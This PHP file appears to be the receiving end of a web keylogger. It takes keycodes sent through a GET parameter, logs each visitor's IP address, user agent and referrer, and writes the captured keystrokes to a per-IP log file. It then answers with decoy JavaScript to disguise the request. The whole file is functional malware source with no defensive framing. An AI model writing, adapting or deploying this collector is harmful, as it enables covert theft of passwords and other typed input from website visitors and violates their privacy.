<?php
// User Information
$timeStamp = date(DateTimeInterface::ATOM); //time (example: 2005-08-15T15:52:01+00:00) 
$ip = $_SERVER['REMOTE_ADDR']; //get ip address
$agent = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown'; //get user agent of visitor
$ref = $_SERVER['HTTP_REFERER'] ?? 'no referrer';  //get referrer

// Prepare Log Entry
$logentry = $timeStamp . " - IP: " . $ip . " | UserAgent: " . $agent . "  | Referrer: " . $ref . "\r\n";

// File
$filename = "keylog_" . $ip . "txt";

if (file_exists($filename) && is_readable($filename)) {
    $fh = fopen($filename, 'a');
} else {
    $fh = fopen($filename, 'w');
}


if (isset($_GET["a"]) && array_key_exists('a', $_GET)) {
    // Append TimeStamp for the Log Entry
    fwrite($fh, $logentry);
    // Get the user input 
    $keys = $_GET["a"];

    // Remove leading zero from user input
    $keys = preg_replace("/\\b0*/", "", $keys);

    switch ($keys) {
        case "8":
            $keylog = "[<--]";
            break;
        case "9":
            $keylog = "[TAB]";
            break;
        case "13":
            $keylog = "[ENTER]";
            break;
        case "17":
            $keylog = "[CTRL]";
            break;
        case "18":
            $keylog = "[ALT]";
            break;
        case "27":
            $keylog = "[ESC]";
            break;
        case "35":
            $keylog = "[END]";
            break;
        case "36":
            $keylog = "[HOME]";
            break;
        case "":
            $keylog = "[SPACE]";
            break;
        default:
            // Convert KeyCode to Letter (e.g. '65' → 'A')
            $keylog = (is_numeric($keys)) ? chr((int) $keys) : "[UNKNOWN:$keys]";
    }

    fwrite($fh, $keylog."\n");
}
// Close the file
fclose($fh);

// Return some BS JS code
// base64 for = "var test ='ooool'; console.log(test);"
$data = base64_decode('dmFyIHRlc3QgPSdvb29vbCc7IGNvbnNvbGUubG9nKHRlc3QpOw==');

header('Content-Type: text/javascript; charset=utf-8');
echo json_encode($data);
?>
